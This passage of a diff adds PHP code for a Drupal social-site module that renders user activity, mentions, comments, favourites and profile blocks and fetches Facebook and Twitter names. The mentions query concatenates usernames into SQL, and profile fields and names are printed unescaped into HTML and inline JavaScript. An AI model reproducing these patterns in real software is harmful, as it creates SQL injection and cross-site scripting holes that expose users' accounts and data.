+	$super_array[$status->number]=$elemento;
+	$super_array[$status->number]->timer=$status->number;
+  }
+
+  ksort($super_array);
+  $reverse = array_reverse($super_array);
+  $total = array_slice($reverse,0,15);
+
+  $nod='even display';
+
+  $profile = content_profile_load('profile', $uid);
+
+  foreach($total as $element){
+
+	      $node=node_load($element->nid);
+	      if($element->timer){
+		    $node->created=$element->timer;
+		    $node->action =$element->action;
+	      }
+	
+	      $output .= grabbit_me_theme_feeds($nod,$node);
+
+  	 if($nod=='odd display'){
+	    $nod='even display';
+      }else{
+	    $nod='odd display';
+      }
+	
+  }
+
+  if($pag){
+    print $output; // if we are paginating this then we print it to the ajax call
+    if(!$output){
+	  print 0;
+    }	
+  }else{
+	$more = '<div class="panel-controller"><a href="javascript:void(0)" uid="'.$uid.'" class="main-stream-next" id="me-more" pid="4" page="2">more</a></div>';
+    return $output.$more;	
+  }
+
+}
+
+
+
+function grabbit_me_get_comments($uid,$limit=10,$pag=FALSE){
+
+  if($pag){
+	$limit_number=10*$pag;
+	$last_number=$limit_number+10;
+    $limit = $limit_number.','.$last_number;	
+  }
+
+  $result = db_query("SELECT extra FROM {grabbit_me} WHERE uid=%d AND type='comment' ORDER BY number DESC LIMIT %s",$uid,$limit);
+
+  $array=array();
+  while ($status = db_fetch_object($result)){
+	
+	$data=unserialize($status->extra);
+	if($data['time'])
+      $array[]=$status;
+  }
+
+  return $array;
+	
+}
+
+
+function grabbit_me_get_mentions($uid,$user_name,$limit=10,$pag=FALSE){
+
+  if($pag){
+	$limit_number=10*$pag;
+	$last_number=$limit_number+10;
+    $limit = $limit_number.','.$last_number;	
+  }
+
+  if($fuser = facebook_grabbit_get_fid($uid)){
+	  $first_facebook=grabbit_me_get_cache_data($uid,'facebook');
+	  if(!$first_facebook || $first_facebook=='NONE'){
+	      $module_name='facebook_grabbit';
+		  require_once(drupal_get_path('module', $module_name)."/facebook/facebook.php");
+		  require_once(drupal_get_path('module', $module_name)."/facebook/facebook_desktop.php");
+		  include(drupal_get_path('module', $module_name)."/facebook/config.php");
+
+		  $suser=$fuser->fid;
+		  $session_key=$fuser->kid;
+	      try{
+
+		    $facebook = new FacebookDesktop($api_key, $secret);
+
+		    if ($facebook->set_user($suser, $session_key)!= null){
+			  drupal_set_message("Facebook connection failed","error");
+			  $facebook_name='NULL';
+		    }
+		    else{
+			  $user_details = $facebook->api_client->users_getInfo($suser, 'username');
+
+			  $facebook_name=$user_details[0]['username']; 
+			}
+
+		  }catch(FacebookRestClientException $e){
+
+		  }
+		
+	    grabbit_me_save_cache_data($uid,'facebook',$facebook_name);	  
+	  }
+  }
+	
+  if($twitter_account = oauth_twitter_get_uid($uid)){
+	$first_twitter=grabbit_me_get_cache_data($uid,'twitter');
+	  if(!$first_twitter || $first_twitter=='NONE'){
+	    $secret=unserialize($twitter_account->config);
+	    $user_id=substr($secret['token'], 0, strpos($secret['token'], "-"));    
+		$response = drupal_http_request('http://twitter.com/users/show/'.$user_id.'.json');
+		$user_twitter=json_decode($response->data);
+	    $twitter_name=$user_twitter->screen_name;
+	    grabbit_me_save_cache_data($uid,'twitter',$twitter_name);
+	  }
+  }
+
+  if(!$user_name)
+    $user_name='randomnamenoexist';
+
+  if(!$first_facebook)
+    $first_facebook='randomnamenoexist';
+
+  if(!$first_twitter)
+    $first_twitter='randomnamenoexist';
+
+  $result = db_query("SELECT * FROM {grabbit_me} WHERE type='status' AND (extra LIKE '%".$user_name."%' 
+                                                                      OR extra LIKE '%".$first_facebook."%' 
+                                                                      OR extra LIKE '%".$first_twitter."%') ORDER BY number DESC LIMIT %d",$limit);
+
+
+  $array=array();
+  while ($status = db_fetch_object($result)){
+    $data=unserialize($status->extra);
+    $array[]=$status;
+  }
+
+  return $array;
+
+}
+
+function grabbit_me_save_cache_data($uid,$type,$name='NULL'){
+	if($name!='NULL'){
+	  variable_set('me_user_'.$uid.'_'.$type, $name);
+	}
+}
+
+function grabbit_me_get_cache_data($uid,$type){
+	$variable = variable_get('me_user_'.$uid.'_'.$type, 'NONE');
+	return $variable;
+}
+
+function grabbit_me_show_activity_comments(){
+	global $user;
+	
+	// get comments
+	$comm = grabbit_me_get_comments($user->uid,$limit=10);
+	if (!count($comm)){
+	  $comments = '<div class="messages-status-updates">You have no comments in grabbit yet</div>';
+	}else{
+	    $nod='even display';
+	  	foreach($comm as $comment){
+		  $item=unserialize($comment->extra);
+		  $item['faid']=$comment->faid;
+	      $comments .= grabbit_me_theme_my_activity_comments($nod,$item);
+	      if($nod=='odd display'){
+		    $nod='even display';
+	      }else{
+		    $nod='odd display';
+	      }
+	    } 
+	}
+	// end comments
+	drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/jquery_scroll.js', $type = 'module');
+	  drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/jquery.truncate-2.3.js', $type = 'module');
+      drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/facebook_grabbit.js', $type = 'module');
+      drupal_add_js(drupal_get_path('module', 'grabbit_tags').'/tags_engine.js', $type = 'module');		
+	
+	       $mesa=drupal_get_messages();
+		   if($mesa['status'][0])
+		     $mensajes = '<div class="messages-status-updates">'.$mesa['status'][0].'</div>';
+	
+			$output .='<div class="panels-controllers">
+			           <div id="panels-pager" class="panels-pager"></div>
+			           <a href="JavaScript:void(0);" class="move-left"></a>
+			           <a href="JavaScript:void(0);" class="move-right"></a>
+			           </div>'.$mensajes.'<div class="panel-grabbit suser-panels">
+			           <div class="panel-grabbit user-panel" id="panel-activity">
+			            <div class="panel-title clearfix">
+						  <div class="controller-top"> 
+						    <h3 class="title">Comments</h3>
+						  </div>
+						</div>';
+						
+			$more = '<div class="panel-controller"><a href="javascript:void(0)" class="main-stream-next" id="me-more" pid="3" uid="'.$uid.'" page="1">more</a></div>';
+			$output .=$comments.$more;
+
+			
+			$output .='</div>';
+
+   return $output;
+	
+}
+
+function grabbit_me_show_activity_mentions(){
+     global $user;
+
+		// get mentions
+		$ment = grabbit_me_get_mentions($user->uid,$user->name);
+		if (!count($ment)){
+		  $mentions = '<div class="messages-status-updates">You have no mentions in grabbit yet</div>';
+		}else{
+		    $nod='even';
+		  	foreach($ment as $m_status){
+			  $item=unserialize($m_status->extra);
+			  $item['faid']=$m_status->faid;
+	          $profile = content_profile_load('profile', $m_status->uid);
+		      $mentions .= grabbit_me_theme_my_activity($nod,$item,$profile,$m_status);
+		      if($nod=='odd'){
+			    $nod='even';
+		      }else{
+			    $nod='odd';
+		      }
+		    } 
+		}
+		// end mentions
+		drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/jquery_scroll.js', $type = 'module');
+		  drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/jquery.truncate-2.3.js', $type = 'module');
+	      drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/facebook_grabbit.js', $type = 'module');
+	      drupal_add_js(drupal_get_path('module', 'grabbit_tags').'/tags_engine.js', $type = 'module');		
+		
+		$mesa=drupal_get_messages();
+		if($mesa['status'][0])
+		  $mensajes = '<div class="messages-status-updates">'.$mesa['status'][0].'</div>';
+
+			$output .='<div class="panels-controllers">
+			           <div id="panels-pager" class="panels-pager"></div>
+			           <a href="JavaScript:void(0);" class="move-left"></a>
+			           <a href="JavaScript:void(0);" class="move-right"></a>
+			           </div>'.$mensajes.'<div class="panel-grabbit suser-panels">
+			           <div class="panel-grabbit user-panel" id="panel-activity">
+			            <div class="panel-title clearfix">
+						  <div class="controller-top"> 
+						    <h3 class="title">Mentions</h3>
+						  </div>
+						</div>';
+			$output .=$mentions;
+
+			
+			$output .='</div>';
+
+   return $output;
+	
+}
+
+function grabbit_me_show_activity_rendered(){
+	global $user;
+	
+	
+    // get statuses
+    $statuses = grabbit_me_get_statuses($user->uid);
+    $profile = content_profile_load('profile', $user->uid);
+    $nod='even';
+    if(!count($statuses)){
+	  $updates = '<div class="messages-status-updates">You have no status updates in grabbit yet</div>';
+    }else{
+	  	foreach($statuses as $status){
+		  $item=unserialize($status->extra);
+		  $item['faid']=$status->faid;
+	      $updates .= grabbit_me_theme_my_activity($nod,$item,$profile,$status);
+	      if($nod=='odd'){
+		    $nod='even';
+	      }else{
+		    $nod='odd';
+	      }
+	    }
+	
+    } 
+      // end statuses
+	drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/jquery_scroll.js', $type = 'module');
+	  drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/jquery.truncate-2.3.js', $type = 'module');
+      drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/facebook_grabbit.js', $type = 'module');
+      drupal_add_js(drupal_get_path('module', 'grabbit_tags').'/tags_engine.js', $type = 'module');		
+
+    $mesa=drupal_get_messages();
+	if($mesa['status'][0])
+	  $mensajes = '<div class="messages-status-updates">'.$mesa['status'][0].'</div>';
+    
+			$output .='<div class="panels-controllers">
+			           <div id="panels-pager" class="panels-pager"></div>
+			           <a href="JavaScript:void(0);" class="move-left"></a>
+			           <a href="JavaScript:void(0);" class="move-right"></a>
+			           </div>'.$mensajes.'<div class="panel-grabbit suser-panels">
+			           <div class="panel-grabbit user-panel" id="panel-activity">
+			            <div class="panel-title clearfix">
+						  <div class="controller-top"> 
+						    <h3 class="title">Last Updates</h3>
+						  </div>
+						</div>';
+			$more = '<div class="panel-controller"><a href="javascript:void(0)" class="main-stream-next" id="me-more" pid="2" uid="'.$uid.'" page="2">more</a></div>';
+			$output .=$updates.$more;
+
+			
+			$output .='</div>';
+	
+
+  return $output;	
+}
+
+function grabbit_me_show_activity_rendered_all(){
+	global $user;
+	
+    $updates = grabbit_me_get_statuses_all($user->uid);
+    drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/jquery_scroll.js', $type = 'module');
+	drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/jquery.truncate-2.3.js', $type = 'module');
+    drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/facebook_grabbit.js', $type = 'module');
+    drupal_add_js(drupal_get_path('module', 'grabbit_tags').'/tags_engine.js', $type = 'module');		
+	
+    $mesa=drupal_get_messages();
+	if($mesa['status'][0])
+	  $mensajes = '<div class="messages-status-updates">'.$mesa['status'][0].'</div>';
+    
+			$output .='<div class="panels-controllers">
+			           <div id="panels-pager" class="panels-pager"></div>
+			           <a href="JavaScript:void(0);" class="move-left"></a>
+			           <a href="JavaScript:void(0);" class="move-right"></a>
+			           </div>'.$mensajes.'<div class="panel-grabbit suser-panels">
+			           <div class="panel-grabbit user-panel" id="panel-activity">
+			            <div class="panel-title clearfix">
+						  <div class="controller-top"> 
+						    <h3 class="title">Last Updates</h3>
+						  </div>
+						</div>';
+			$output .=$updates;
+
+			
+			$output .='</div>';
+	
+
+  return $output;	
+}
+
+
+function grabbit_me_show_activity_friends(){
+	global $user;
+	
+	drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/jquery_scroll.js', $type = 'module');
+	  drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/jquery.truncate-2.3.js', $type = 'module');
+      drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/facebook_grabbit.js', $type = 'module');
+      drupal_add_js(drupal_get_path('module', 'grabbit_tags').'/tags_engine.js', $type = 'module');		
+	
+    $updates = grabbit_me_get_statuses_friends($user->uid);
+    $mesa=drupal_get_messages();
+	if($mesa['status'][0])
+	  $mensajes = '<div class="messages-status-updates">'.$mesa['status'][0].'</div>';
+	
+			$output .='<div class="panels-controllers">
+			           <div id="panels-pager" class="panels-pager"></div>
+			           <a href="JavaScript:void(0);" class="move-left"></a>
+			           <a href="JavaScript:void(0);" class="move-right"></a>
+			           </div>'.$mensajes.'<div class="panel-grabbit suser-panels">
+			           <div class="panel-grabbit user-panel" id="panel-activity">
+			            <div class="panel-title clearfix">
+						  <div class="controller-top"> 
+						    <h3 class="title">Last Updates</h3>
+						  </div>
+						</div>';
+			$output .=$updates;
+
+			
+			$output .='</div>';
+	
+
+  return $output;	
+}
+
+
+function grabbit_me_show_activity_rss(){
+	global $user;
+	
+	drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/jquery_scroll.js', $type = 'module');
+	  drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/jquery.truncate-2.3.js', $type = 'module');
+      drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/facebook_grabbit.js', $type = 'module');
+      drupal_add_js(drupal_get_path('module', 'grabbit_tags').'/tags_engine.js', $type = 'module');		
+	
+    $updates = grabbit_me_get_statuses_rss($user->uid);
+    $mesa=drupal_get_messages();
+	if($mesa['status'][0])
+	  $mensajes = '<div class="messages-status-updates">'.$mesa['status'][0].'</div>';
+	
+			$output .='<div class="panels-controllers">
+			           <div id="panels-pager" class="panels-pager"></div>
+			           <a href="JavaScript:void(0);" class="move-left"></a>
+			           <a href="JavaScript:void(0);" class="move-right"></a>
+			           </div>'.$mensajes.'<div class="panel-grabbit suser-panels">
+			           <div class="panel-grabbit user-panel" id="panel-activity">
+			            <div class="panel-title clearfix">
+						  <div class="controller-top"> 
+						    <h3 class="title">Last Updates</h3>
+						  </div>
+						</div>';
+			$output .=$updates;
+
+			
+			$output .='</div>';
+	
+
+  return $output;	
+}
+
+//to get all your friends--> grabbit_me_db_statuses('count', $user->uid, NULL, 1, 'TW_BOTH')
+
+function grabbit_me_db_statuses($op, $requester, $requestee, $rtid, $status) {
+
+  $requester = friendlist_api_user_into_uid($requester);
+  $requestee = friendlist_api_user_into_uid($requestee);
+
+  if ($requester !== NULL) {
+    $cond  .= ' AND fs.requester_id = %d ';
+    $parm[] = $requester;
+  }
+
+  if ($requestee !== NULL) {
+    $cond  .= ' AND fs.requestee_id = %d ';
+    $parm[] = $requestee;
+  }
+
+  if ($rtid !== NULL) {
+    $cond  .= ' AND fs.rtid = %d ';
+    $parm[] = $rtid;
+  }
+
+  if ($status != NULL) {
+
+    if (is_array($status)) {
+
+      // Turn the conditions into a query.
+      foreach ($status as $status_value) {
+        $cond_status[] = "fs.status LIKE '%s'";
+        $parm[] = $status_value;
+      }
+      $cond .= 'AND ('. implode(' OR ', $cond_status) .')' ;
+
+    }
+    else {
+      $cond  .= " AND fs.status LIKE '%s' ";
+      $parm[] = $status;
+    }
+  }
+
+  if ($op == 'count') {
+    $query = "SELECT COUNT(*) FROM {friendlist_statuses} fs JOIN {users} u WHERE u.uid=fs.requestee_id AND u.status = 1 AND 1 = 1 $cond";
+    return db_result(db_query($query, $parm));
+  }
+  else {
+    $query = "SELECT * FROM {friendlist_statuses} fs WHERE 1 = 1 $cond";
+    return db_query($query, $parm);
+  }
+}
+
+
+/**
+ * Implementation of hook_block()
+ */
+function grabbit_me_block($op = 'list', $delta = 0, $edit = array()) {
+  switch($op) {
+    case 'list':
+      $blocks[0]['info'] = t('My Profile');
+      $blocks[1]['info'] = t('My Tags');
+      $blocks[2]['info'] = t('My Account');
+      return $blocks;
+      break;
+    case 'view':
+      drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/jquery.alerts.js', $type = 'module');
+      drupal_add_css(drupal_get_path('module', 'grabbit_panels').'/jquery.alerts.css', $type = 'module');
+      drupal_add_js(drupal_get_path('module', 'grabbit_me').'/jquery.editable-1.3.3.js', $type = 'module');
+      drupal_add_js(drupal_get_path('module', 'grabbit_me').'/edit_engine.js', $type = 'module');
+      switch ( $delta )
+      {
+		case 0:
+          $blocks['title'] = t('My Profile');
+          $blocks['content'] = grabbit_me_get_my_profile();
+
+          break;
+		case 1:
+          $blocks['title'] = t('My Tags');
+          $blocks['content'] = grabbit_me_get_my_tags();
+          	
+          break;
+		case 2:
+		  $blocks['title']=t('My Account');
+          $blocks['content'] = grabbit_me_get_my_account();	
+		
+          break;
+      }
+      return $blocks;
+      break;
+  }
+}
+
+function grabbit_me_get_my_profile(){
+	
+	if(arg(0)=='user' && arg(1)){
+	  $user=user_load(arg(1));
+	  $you=1;
+	}else{
+	  	if(arg(0)=='you'){
+			$user=user_load(arg(2));
+			$you=1;
+		  }else{
+		    global $user;	
+		  }	
+	}
+	
+	
+	$profile = content_profile_load('profile', $user->uid);
+	if($profile->field_profile_websites){
+	  	foreach($profile->field_profile_websites as $website){
+			$webs .= $website['value'].'<br>';
+		}	
+	}
+	
+	if($user->uid>0){
+		if($fuser = facebook_grabbit_get_fid($user->uid))
+		  $services = '<img src="'.base_path().drupal_get_path('module', 'grabbit_me').'/profile_fb.png" />';
+	
+		if($twitter_account = oauth_twitter_get_uid($user->uid))
+		  $services .= ' <img src="'.base_path().drupal_get_path('module', 'grabbit_me').'/profile_tw.png" />';
+	
+		if($gmail_user = grabbit_gmail_get($user->uid))
+		  $services .= ' <img src="'.base_path().drupal_get_path('module', 'grabbit_me').'/profile_gm.png" />';
+		
+		$services .= ' <a href="'.base_path().'activity/rss?uid='.$user->uid.'" title="Subscribe to user activity"><img src="'.base_path().drupal_get_path('module', 'grabbit_me').'/profile_rss.png" /></a>';
+	  
+	}
+	if($profile->field_profile_picture[0]['filepath']){
+		$my_image=theme('imagecache', 'me_image', $profile->field_profile_picture[0]['filepath'], 'My Image');
+		
+	}else{
+		$my_image='<img src="'.base_path().'sites/all/themes/grabbit/images/default/default_profile.jpg" />';
+		
+	}
+	
+	if(!$you)
+      $edit='<a href="#" class="edit-me-place no-confirm-place">Edit</a>';
+	
+	$output = '<div class="edit-panel">'.$edit.'</div><div class="user-profile-block">
+	<div id="bio-no-edit">
+	<div class="main-info clear-block">
+	  <div class="image">'.$my_image.'</div>
+	  <div class="user-name">'.$user->name.'</div>
+	  <div class="friends">Friends: <span class="blue">'.grabbit_me_db_statuses('count', $user->uid, NULL, 1, 'TW_BOTH').'</span></div>
+	  <div class="post">Posts: <span class="blue">'.grabbit_statistics_post_get_total($user->uid,'all').'</span></div>
+	  <div class="req">Request: <span class="blue">'.grabbit_me_db_statuses('count',NULL,$user->uid, 1, 'TW_1_TO_2_P').'</span></div>
+	  <div class="resources">'.$services.'</div>
+	</div>
+	
+	<div class="other-info">
+	  <div class="bio display"><strong>'.$profile->title.'</strong></div>
+	  <div class="bio submiter">'.$profile->field_profile_about[0]['value'].'</div>
+	  <div class="city submiter">'.$profile->field_profile_city[0]['value'].'</div>
+	  <div class="state submiter"> '.$profile->field_profile_state[0]['value'].'</div>
+	  <div class="country submiter">'.$profile->field_profile_country[0]['value'].'</div>
+	  <div class="websites submiter">'.$webs.'</div>
+	</div>
+	</div>
+	<div id="user-profile-form" style="display:none">
+	    <a href="JavaScript:void(0);" id="upload" >Change Picture</a>
+	    <span id="status" ></span>    
+		<ul id="files" ></ul> 
+	  <form id="user-profile-ajax-form">
+	<div class="bio-item">    
+	<label>Display name:</label>
+	 <input type="text" value="'.$profile->title.'" id="name" name="name"/>
+	</div>
+	<div class="bio-item">    
+	<label>About you:</label>
+	    <textarea id="bio" name="bio">'.$profile->field_profile_about[0]['value'].'</textarea>
+	</div>
+	<div class="bio-item">
+	<label>City:</label>    
+	<input type="text" value="'.$profile->field_profile_city[0]['value'].'" id="city" name="city"/>
+	</div>
+	<div class="bio-item">
+	<label>State:</label>    
+	<input type="text" value="'.$profile->field_profile_state[0]['value'].'" id="state" name="city"/>
+	</div>
+	<div class="bio-item">
+	<label>Country:</label>    
+	<input type="text" value="'.$profile->field_profile_country[0]['value'].'" id="country" name="country"/>
+	</div>
+	<div class="bio-item">
+	<label>Websites (one per line):</label>    
+	<textarea id="webs" name="webs">'.str_replace("<br>","\n",$webs).'</textarea>
+	</div>
+	<div class="bio-item">      
+	<button type="button" id="bio-submit">Save</button>
+	<button type="button" id="bio-cancel">Cancel</button>
+	</div>
+	  </form>
+	</div>
+	
+	</div>';
+	
+	return $output;
+	
+}
+
+function grabbit_me_get_my_tags(){
+	
+	if(arg(0)=='user' && arg(1)){
+	  $user=user_load(arg(1));
+	  $you=1;
+	}else{
+		if(arg(0)=='you'){
+			$user=user_load(arg(2));
+			$you=1;
+		  }else{
+		    global $user;	
+		  }	
+	}
+
+    $feeds=array();
+    $hobbies=array();
+    $topics=array();
+    $interests=array();	
+	$profile = content_profile_load('profile', $user->uid);
+
+    
+
+    if($profile->field_profile_hobbies):	
+	foreach($profile->field_profile_hobbies as $hobbie){
+		$hobbies[]=$profile->taxonomy[$hobbie['value']]->name;
+		unset($profile->taxonomy[$hobbie['value']]);
+	}
+	endif;
+	if($profile->field_profile_topics):
+	foreach($profile->field_profile_topics as $topic){
+		$topics[]=$profile->taxonomy[$topic['value']]->name;
+		unset($profile->taxonomy[$topic['value']]);
+	}
+	endif;
+	if($profile->field_profile_interests):
+	foreach($profile->field_profile_interests as $interest){
+		$interests[]=$profile->taxonomy[$interest['value']]->name;
+		unset($profile->taxonomy[$interest['value']]);
+	}
+	endif;
+	if($profile->taxonomy):
+	foreach($profile->taxonomy as $feed){
+		$feeds[]=$feed->name;
+	}
+	endif;
+
+    if(!$you)
+	  $edit='<a href="#" id="edit-user-tags">Edit</a>';
+	
+	$output = '<div class="edit-panel">'.$edit.'</div>
+	<div class="user-tags-block">
+	 <div id="tags-info"> 
+	  <div class="hobbies"><h3>Hobbies: </h3>'.implode(', ',$hobbies).'</div>
+	  <div class="topics"><h3>Topics: </h3>'.implode(', ',$topics).'</div>
+	  <div class="interests"><h3>Interests: </h3>'.implode(', ',$interests).'</div>
+	  <div class="feeds-keywords"><h3>Feed keywords: </h3>'.implode(', ',$feeds).'</div>
+	 </div>
+	
+	<div id="user-tags-form" style="display:none">
+	  <form id="user-tags-ajax-form">
+	
+	<div class="tags-item">
+	<label>A comma-separated list</label>    
+	<label>Hobbies:</label>
+	    <textarea id="hobbies" name="hobbies">'.implode(', ',$hobbies).'</textarea>
+	</div>
+	
+	<div class="tags-item">    
+	<label>Topics:</label>
+	    <textarea id="topics" name="topics">'.implode(', ',$topics).'</textarea>
+	</div>
+	
+	<div class="tags-item">    
+	<label>Interests:</label>
+	    <textarea id="interests" name="interests">'.implode(', ',$interests).'</textarea>
+	</div>
+	
+	<div class="tags-item">    
+	<label>Feed keywords:</label>
+	    <textarea id="feeds" name="feeds">'.implode(', ',$feeds).'</textarea>
+	</div>
+	
+	<div class="tags-item">      
+	<button type="button" id="tags-submit">Save</button>
+	<button type="button" id="tags-cancel">Cancel</button>
+	</div>
+	  </form>
+	</div>
+	
+	</div>';
+	
+	return $output;
+	
+}
+
+function grabbit_me_get_my_account(){
+	global $user;
+	
+	$output = '<div class="edit-panel">'.l('edit','user/me/edit').'</div>
+	<div class="user-tags-block">
+	  
+	  <div class="email"><h3>Email: </h3>'.$user->mail.'</div>
+	  <div class="pass"><h3>Pass: </h3> ******</div>
+	  <div class="name"><h3>Name: </h3>'.$user->name.'</div>
+	  <div class="timezone"><h3>Timezone: </h3>'.$user->timezone.'</div>
+	
+	</div>';
+	
+	return $output;
+}
+
+function grabbit_me_user($op, &$edit, &$account, $category = NULL){
+
+    if ($op == "login"){
+        drupal_goto('user/me');
+    }
+}
+
+function grabbit_me_preprocess_user_profile(&$variables){
+	global $user;
+	
+	$status = friendlist_api_relation_status_calculate($user->uid, $variables['account']->uid, 1);
+    if($status=='TW_BOTH' || user_access('administer users')){
+	  drupal_add_js("$(document).ready(function(){ $('body').addClass('profile-extended-view'); 
+	                 $('.content-truncated').truncate( 135,{
+					        trail: [ '...<a href=\'#\' class=\'truncate_show\'>more</a>', '<a href=\'#\' class=\'truncate_hide\'>less</a>' ]
+					});  })",'inline');
+	  drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/jquery_scroll.js', $type = 'module');
+	  drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/jquery.truncate-2.3.js', $type = 'module');
+      drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/facebook_grabbit.js', $type = 'module');
+	
+	  $updates = grabbit_me_get_statuses_all($variables['account']->uid);
+	
+	  $variables['user_profile'] =theme_you_activity($variables['account']->uid, $variables['account']->name,TRUE);
+	  $variables['user_profile'] .='<div class="you-profile"><div id="panel-activity" class="panel-grabbit user-panel"><div class="panel-title clearfix"><div class="controller-top"> 
+	   <h3 class="title">Last Updates</h3></div></div>';
+	  $variables['user_profile'] .= $updates.'</div></div>';
+	  $variables['extended_view'] = 'Extended';  
+    }
+
+
+}
+
+
+function theme_you_activity($you,$you_name,$is_section=FALSE){
+	
+	if($is_section){
+		$class='active';
+	}
+	
+	drupal_add_js("$(document).ready(function(){ $('body').addClass('profile-extended-view'); $('#block-views-friends-block_1 .title').html('".$you_name."’s Friends'); $('#block-views-friends-block_1 .title').css('text-transform','none'); })",'inline');
+	drupal_add_js("$(document).ready(function(){ $('#block-grabbit_me-1 .title').html('".$you_name."’s Tags'); $('#block-grabbit_me-1 .title').css('text-transform','none'); })",'inline');
+	drupal_add_js("$(document).ready(function(){ $('#block-grabbit_me-0 .title').html('".$you_name."’s Profile'); $('#block-grabbit_me-0 .title').css('text-transform','none'); })",'inline');
+	
+	$tabs='<div class="tabs you-tabs"><ul class="tabs primary clear-block">
+	<li><span class="tab">'.l('All Activity','users/'.$you_name,array('attributes'=>array('class'=>$class))).'</span></li>
+	<li><span class="tab">'.l('Status updates','you/updates/'.$you).'</span></li>
+	<li><span class="tab">'.l('Comments','you/comments/'.$you).'</span></li>
+	<li><span class="tab">'.l('Favorites','you/favorites/'.$you).'</span></li>
+	<li><span class="tab">'.l('Added RSS','you/rss/'.$you).'</span></li>
+	<li><span class="tab">'.l('Mentions','you/mentions/'.$you).'</span></li>
+	</ul></div>';
+	//
+	return $tabs;
+	
+}
+
+function grabbit_me_you_updates(){
+	global $user;
+	
+	$friend = user_load(arg(2));
+	
+	$status = friendlist_api_relation_status_calculate($user->uid, $friend->uid, 1);
+    if($status=='TW_BOTH' || user_access('administer users')){
+	  drupal_add_js("$(document).ready(function(){ $('body').addClass('profile-extended-view'); $('#content-area .title').html('".$friend->name." Updates'); 
+	                 $('.content-truncated').truncate( 135,{
+					        trail: [ '...<a href=\'#\' class=\'truncate_show\'>more</a>', '<a href=\'#\' class=\'truncate_hide\'>less</a>' ]
+					});  })",'inline');
+	  drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/jquery_scroll.js', $type = 'module');
+	  drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/jquery.truncate-2.3.js', $type = 'module');
+      drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/facebook_grabbit.js', $type = 'module');
+	
+	  $output = theme_you_activity($friend->uid, $friend->name);
+	  $output .=grabbit_me_you_activity_rendered($friend);
+	  return $output;
+	}else{
+		drupal_goto('users/'.$friend->name);
+	}
+}
+
+function grabbit_me_you_favorites(){
+	global $user;
+	
+	$friend = user_load(arg(2));
+	
+	$status = friendlist_api_relation_status_calculate($user->uid, $friend->uid, 1);
+    if($status=='TW_BOTH' || user_access('administer users')){
+	  drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/jquery_scroll.js', $type = 'module');
+	  drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/facebook_grabbit.js', $type = 'module');
+	
+      drupal_add_js("$(document).ready(function(){ $('body').addClass('profile-extended-view'); $('#content-area .title').html('".$friend->name." Favorites'); })",'inline');
+	  $output = theme_you_activity($friend->uid, $friend->name);
+	  $output .= grabbit_me_you_get_favorites($friend);
+	  return $output;
+	}else{
+		drupal_goto('users/'.$friend->name);
+	}
+}
+
+function grabbit_me_you_get_favorites($user){
+	if(!$user)
+	  global $user;
+	
+	drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/jquery.truncate-2.3.js', $type = 'module');
+	drupal_add_js(drupal_get_path('module', 'grabbit_uploads').'/jquery.form.js', $type = 'module');
+	drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/engine.js', $type = 'module');
+	drupal_add_js(drupal_get_path('module', 'grabbit_panels').'/jquery.alerts.js', $type = 'module');
+	drupal_add_css(drupal_get_path('module', 'grabbit_panels').'/jquery.alerts.css', $type = 'module');
+	drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/jquery_scroll.js', $type = 'module');
+    drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/facebook_grabbit.js', $type = 'module');
+	
+	
+	$view = views_get_view('flag_bookmarks_tab');
+	$view->set_arguments(array($user->uid));	
+	$view->pager['items_per_page']=30;
+	$view->execute();
+	
+	foreach($view->result as $node){
+	  
+	  $twitface[$node->node_created]=array('time'=>$node->node_created,
+	                                       'value'=>$node);
+    }
+
+    $mesa=drupal_get_messages();
+	if($mesa['status'][0])
+	  $mensajes = '<div class="messages-status-updates">'.$mesa['status'][0].'</div>';
+	
+
+	$resultados = facebook_grabbit_theme_results($twitface);
+	
+		$output .=$mensajes.'<div class="panel-grabbit suser-panels">
+		           <div class="panel-favorites">';
+		$output .=$resultados;
+	
+		$output .='</div></div>';
+	    
+	
+	return $output;
+}
+
+
+function grabbit_me_you_comments(){
+	global $user;
+	
+	$friend = user_load(arg(2));
+	
+	$status = friendlist_api_relation_status_calculate($user->uid, $friend->uid, 1);
+    if($status=='TW_BOTH' || user_access('administer users')){
+	  drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/jquery_scroll.js', $type = 'module');
+	  drupal_add_js(drupal_get_path('module', 'facebook_grabbit').'/facebook_grabbit.js', $type = 'module');
+	
+      drupal_add_js("$(document).ready(function(){ $('body').addClass('profile-extended-view'); $('#content-area .title').html('".$friend->name." Comments'); })",'inline');
+	  
+	  $output = theme_you_activity($friend->uid, $friend->name);
+	  $output .=grabbit_me_you_activity_comments($friend);
+	  return $output;
+	}else{
+		drupal_goto('users/'.$friend->name);
+	}
+}
+
+function grabbit_me_you_friends(){
+	global $user;
+	
+	$friend = user_load(arg(2));
+	
+	$status = friendlist_api_relation_status_calculate($user->uid, $friend->uid, 1);
+    if($status=='TW_BOTH' || user_access('administer users')){
